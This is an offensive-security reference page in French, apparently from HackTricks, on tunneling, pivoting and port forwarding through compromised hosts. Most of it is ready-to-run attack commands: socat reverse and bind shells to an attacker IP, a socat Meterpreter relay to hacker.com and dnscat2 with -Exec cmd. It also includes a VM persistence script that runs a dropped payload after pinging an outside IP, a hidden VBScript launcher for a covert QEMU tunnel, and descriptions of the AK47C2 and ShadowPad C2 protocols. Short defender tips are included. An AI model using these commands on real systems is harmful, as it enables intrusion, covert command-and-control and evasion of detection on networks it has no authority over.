# Tunneling et Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Astuce Nmap

> [!WARNING]
> **ICMP** et **SYN** scans ne peuvent pas être tunnelisés via des proxies socks, donc nous devons **désactiver la découverte par ping** (`-Pn`) et spécifier des **TCP scans** (`-sT`) pour que cela fonctionne.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connexion graphique SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Ouvrir un nouveau Port sur SSH Server --> autre Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port local --> hôte compromis (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port local --> hôte compromis (SSH) --> n'importe où
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Ceci est utile pour obtenir des reverse shells depuis des hosts internes à travers une DMZ vers votre host :
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Vous avez besoin de **root dans les deux appareils** (puisque vous allez créer de nouvelles interfaces) et la configuration de sshd doit autoriser le root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Activer le forwarding côté serveur
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Définir une nouvelle route côté client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sécurité – Terrapin Attack (CVE-2023-48795)**
> L'attaque de downgrade Terrapin de 2023 peut permettre à un man-in-the-middle d'altérer le early SSH handshake et d'injecter des données dans **any forwarded channel** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont patchés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de vous fier aux tunnels SSH.

## SSHUTTLE

Vous pouvez **tunnel** via **ssh** tout le **traffic** vers un **subnetwork** à travers un hôte.\
Par exemple, rediriger tout le **traffic** à destination de 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Se connecter avec une clé privée
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port local --> Hôte compromis (session active) --> Troisième_machine:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Une autre façon :
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Ouvrez un port sur le teamserver, à l'écoute sur toutes les interfaces, qui peut être utilisé pour **router le trafic via le beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Dans ce cas, le **port est ouvert sur le beacon host**, pas sur le Team Server et le trafic est envoyé au Team Server puis de là vers le host:port indiqué
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
À noter :

- Beacon's reverse port forward est conçu pour **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Le trafic est **tunneled within Beacon's C2 traffic**, including P2P links.
- **Admin privileges are not required** pour créer des reverse port forwards sur les ports élevés.

### rPort2Port local

> [!WARNING]
> Dans ce cas, le **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeOrg)

Vous devez téléverser un fichier tunnel web : ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Vous pouvez le télécharger depuis la page des releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Vous devez utiliser la **même version pour le client et le serveur**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Utilisez la même version pour agent et proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Liaison et écoute de l'agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Accéder aux ports locaux de l'agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Le tunnel est démarré depuis la victime.\
Un socks4 proxy est créé sur 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot via **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port via socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter via SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Vous pouvez contourner un **non-authenticated proxy** en exécutant cette ligne au lieu de la dernière dans la console de la victime:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel SSL Socat

**/bin/sh console**

Créer des certificats des deux côtés : Client et Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Relier le port SSH local (22) au port 443 de l'hôte de l'attaquant
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

C'est comme une version console de PuTTY (les options sont très similaires à celles d'un ssh client).

Comme ce binaire sera exécuté sur la victim et qu'il s'agit d'un ssh client, nous devons ouvrir notre ssh service et port afin d'avoir une reverse connection. Ensuite, pour forwarder uniquement un port accessible localement vers un port de notre machine :
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Vous devez être administrateur local (pour n'importe quel port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Vous devez avoir **un accès RDP au système**.\

Téléchargez :

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable du **tunneling packets over the RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nous pouvons maintenant nous **connect** au **victim** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir une **invite** indiquant que le **SocksOverRDP plugin is enabled**, et qu'il va **listen** sur **127.0.0.1:1080**.

**Connect** via **RDP** et upload & execute sur la machine victim le binaire `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est à l'écoute :
```
netstat -antb | findstr 1080
```
Now you can use [**Proxifier**](https://www.proxifier.com/) **pour proxy le trafic à travers ce port.**

## Proxify Windows GUI Apps

You can make Windows GUI apps navigate through a proxy using [**Proxifier**].\
Dans **Profile -> Proxy Servers** ajoutez l'IP et le port du serveur SOCKS.\
Dans **Profile -> Proxification Rules** ajoutez le nom du programme à proxify et les connexions vers les IPs que vous voulez proxify.

## NTLM proxy bypass

L'outil mentionné précédemment : **Rpivot**\
OpenVPN peut aussi le contourner, en définissant ces options dans le fichier de configuration:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Il s'authentifie auprès d'un proxy et lie un port localement qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
Par exemple, il redirige le port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Par exemple, si vous configurez sur la victime le service **SSH** pour écouter sur le port 443. Vous pouvez vous y connecter via le port 2222 de l'attaquant.\
Vous pouvez aussi utiliser un **meterpreter** qui se connecte à localhost:443 tandis que l'attaquant écoute sur le port 2222.

## YARP

Un reverse proxy créé par Microsoft. Vous pouvez le trouver ici : [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root est nécessaire sur les deux systèmes pour créer des tun adapters et tunneliser les données entre eux en utilisant des requêtes DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Le tunnel sera très lent. Vous pouvez créer une connexion SSH compressée à travers ce tunnel en utilisant :
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Établit un canal C\&C via DNS. Il n'a pas besoin de privilèges root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Dans PowerShell**

Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Redirection de port avec dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Modifier le DNS de proxychains

Proxychains intercepte l'appel libc `gethostbyname` et fait transiter les requêtes DNS tcp via le proxy socks. Par **default** le serveur **DNS** utilisé par proxychains est **4.2.2.2** (hardcoded). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et modifiez l'IP. Si vous êtes dans un **Windows environment** vous pouvez définir l'IP du **domain controller**.

## Tunnels en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 DNS TXT / HTTP JSON personnalisé (AK47C2)

L'acteur Storm-2603 a créé un **C2 à double canal ("AK47C2")** qui abuse *uniquement* du trafic sortant **DNS** et **HTTP POST en clair** – deux protocoles rarement bloqués sur les réseaux d'entreprise.

1. **Mode DNS (AK47DNS)**
• Génère un SessionID aléatoire de 5 caractères (p.ex. `H4T14`).
• Préfixe `1` pour les *task requests* ou `2` pour les *results* et concatène différents champs (flags, SessionID, nom de l'ordinateur).
• Chaque champ est **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, et assemblé avec des points – se terminant enfin par le domaine contrôlé par l'attaquant :

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Les requêtes utilisent `DnsQuery()` pour les enregistrements **TXT** (et en fallback **MG**).
• Quand la réponse dépasse 0xFF octets, la backdoor **fragmente** les données en morceaux de 63 octets et insère les marqueurs :
`s<SessionID>t<TOTAL>p<POS>` afin que le serveur C2 puisse les réordonner.

2. **Mode HTTP (AK47HTTP)**
• Construit une enveloppe JSON :
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• L'ensemble du blob est XOR-`VHBD@H` → hex → envoyé comme corps d'un **`POST /`** avec l'en-tête `Content-Type: text/plain`.
• La réponse suit le même encodage et le champ `cmd` est exécuté via `cmd.exe /c <command> 2>&1`.

Notes Blue Team
• Recherchez des requêtes **TXT** inhabituelles dont le premier label est un long hexadécimal et se termine toujours par un domaine rare.
• Une clé XOR constante suivie d'ASCII-hex est facile à détecter avec YARA : `6?56484244?484` (`VHBD@H` en hex).
• Pour HTTP, signalez les corps de POST text/plain composés uniquement d'hex et dont la longueur est multiple de deux octets.

{{#note}}
L'ensemble du canal tient dans des **requêtes conformes aux RFC** et garde chaque label de sous-domaine sous 63 octets, le rendant discret dans la plupart des logs DNS.
{{#endnote}}

## Tunnel ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Un accès root est nécessaire sur les deux systèmes pour créer des adaptateurs tun et tunneliser les données entre eux en utilisant des requêtes ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Téléchargez-le ici**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **est un outil permettant d'exposer des services sur Internet en une seule ligne de commande.**\
_Les URI d'exposition ressemblent à:_ **UID.ngrok.io**

### Installation

- Créer un compte: https://ngrok.com/signup
- Téléchargement du client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Utilisations de base

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Il est également possible d'ajouter une authentification et TLS si nécessaire._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exposer des fichiers via HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing des requêtes HTTP

_Utile pour XSS, SSRF, SSTI ..._\
Directement depuis stdout ou via l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling d'un service HTTP interne
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml — exemple simple de configuration

Il ouvre 3 tunnels :

- 2 TCP
- 1 HTTP servant des fichiers statiques depuis /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **local TCP/UDP services** sans nécessiter de règles de pare-feu entrantes, en utilisant Cloudflare’s edge comme point de rendez-vous. C'est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.

### One-liner rapide
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Tunnels persistants avec DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Démarrez le connecteur :
```bash
cloudflared tunnel run mytunnel
```
Parce que tout le trafic sort de l'hôte **en sortie via le port 443**, les tunnels Cloudflared sont un moyen simple de contourner les ingress ACLs ou les NAT boundaries. Attention : le binaire s'exécute généralement avec des privilèges élevés — utilisez des conteneurs ou l'option `--user` quand c'est possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme un **SSH Tunnel Gateway**, de sorte qu'un hôte cible peut lancer un reverse tunnel en n'utilisant que le client OpenSSH standard — aucun binaire supplémentaire requis.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Utiliser la nouvelle passerelle SSH (sans binaire frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
La commande ci‑dessus publie le port de la victime **8080** en tant que **attacker_ip:9000** sans déployer d'outillage supplémentaire – idéal pour le living-off-the-land pivoting.

## Tunnels discrets basés sur VM avec QEMU

Le user-mode networking de QEMU (`-netdev user`) prend en charge une option appelée `hostfwd` qui **attache un port TCP/UDP sur l'*hôte* et le redirige vers l'*invité***. Lorsque l'invité exécute un SSH daemon complet, la règle hostfwd vous fournit un jump box SSH jetable qui vit entièrement à l'intérieur d'une VM éphémère – parfait pour masquer le trafic C2 face à l'EDR parce que toutes les activités malveillantes et les fichiers restent sur le disque virtuel.

### Commande rapide en une ligne
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• La commande ci‑dessus lance une image **Tiny Core Linux** (`tc.qcow2`) en RAM.
• Le port **2222/tcp** de l'hôte Windows est redirigé de façon transparente vers **22/tcp** à l'intérieur de la VM.
• Du point de vue de l'attaquant, la cible n'expose que le port 2222 ; tous les paquets qui l'atteignent sont traités par le serveur SSH s'exécutant dans la VM.

### Lancement furtif via VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Lancer le script avec `cscript.exe //B update.vbs` garde la fenêtre masquée.

### Persistance dans la VM

Parce que Tiny Core est sans état, les attaquants font généralement :

1. Déposent le payload dans `/opt/123.out`
2. Ajoutent à `/opt/bootlocal.sh` :

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ajoutent `home/tc` et `opt` à `/opt/filetool.lst` pour que le payload soit empaqueté dans `mydata.tgz` à l'arrêt.

### Pourquoi cela échappe à la détection

• Seuls deux exécutables non signés (`qemu-system-*.exe`) écrivent sur le disque ; aucun driver ni service n'est installé.  
• Les produits de sécurité sur l'hôte voient du **trafic loopback bénin** (le C2 réel se termine à l'intérieur de la VM).  
• Les scanners mémoire n'analysent jamais l'espace de processus malveillants car il s'exécute dans un autre OS.

### Conseils pour les défenseurs

• Déclencher une alerte sur les **binaires QEMU/VirtualBox/KVM inattendus** dans des chemins modifiables par l'utilisateur.  
• Bloquer les connexions sortantes qui proviennent de `qemu-system*.exe`.  
• Rechercher des ports d'écoute rares (2222, 10022, …) qui s'ouvrent immédiatement après le lancement de QEMU.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Le module IIS de ShadowPad d'Ink Dragon transforme chaque serveur web périmétrique compromis en un **backdoor + relay** à double usage en liant des préfixes d'URL discrets directement au niveau de HTTP.sys :

* **Paramètres par défaut** – si la config JSON du module omet des valeurs, elle retombe sur des valeurs IIS crédibles (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Ainsi, le trafic bénin est servi par IIS avec la signature correcte.  
* **Wildcard interception** – les opérateurs fournissent une liste de préfixes d'URL séparés par des points-virgules (wildcards dans l'hôte + le chemin). Le module appelle `HttpAddUrl` pour chaque entrée, donc HTTP.sys achemine les requêtes correspondantes vers le handler malveillant *avant* que la requête n'atteigne les modules IIS.  
* **Encrypted first packet** – les deux premiers octets du corps de la requête contiennent la seed pour un PRNG 32-bit personnalisé. Chaque octet suivant est XORé avec le keystream généré avant le parsing du protocole :

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orchestration du relais** – le module maintient deux listes : “servers” (nœuds upstream) et “clients” (implants downstream). Les entrées sont élaguées si aucun heartbeat n'arrive sous ~30 secondes. Quand les deux listes ne sont pas vides, il associe le premier server sain au premier client sain et transfère simplement des octets entre leurs sockets jusqu'à la fermeture d'un côté.  
* **Télémétrie de debug** – la journalisation optionnelle enregistre l'IP source, l'IP de destination et le total d'octets transférés pour chaque appariement. Les enquêteurs ont utilisé ces traces pour reconstruire le maillage ShadowPad couvrant plusieurs victimes.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Références

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
